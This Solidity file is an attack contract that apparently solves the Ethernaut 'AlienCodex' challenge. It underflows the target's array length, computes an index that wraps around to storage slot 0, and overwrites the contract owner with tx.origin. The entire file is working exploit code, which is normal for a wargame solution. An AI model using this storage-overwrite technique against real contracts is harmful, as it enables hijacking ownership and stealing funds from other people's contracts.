// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {AlienCodex} from "./AlienCodex.sol";
contract AlienCodexAttack {
    AlienCodex target;

    constructor(address _target) {
        target = AlienCodex(_target);
        // Step 1: Make contact
        target.makeContact();

        // Step 2: Underflow the array length
        target.retract();

        // Step 3: Calculate the index to access storage slot 0 (owner slot)
        uint256 index = 0;
        unchecked {
            index -= uint256(keccak256(abi.encodePacked(uint256(1))));
        }
        

        // Step 4: Overwrite the owner with your address
        target.revise(index, bytes32(uint256(uint160(tx.origin))));
        require(target.owner() == tx.origin, "NOT OWNER");
    }
}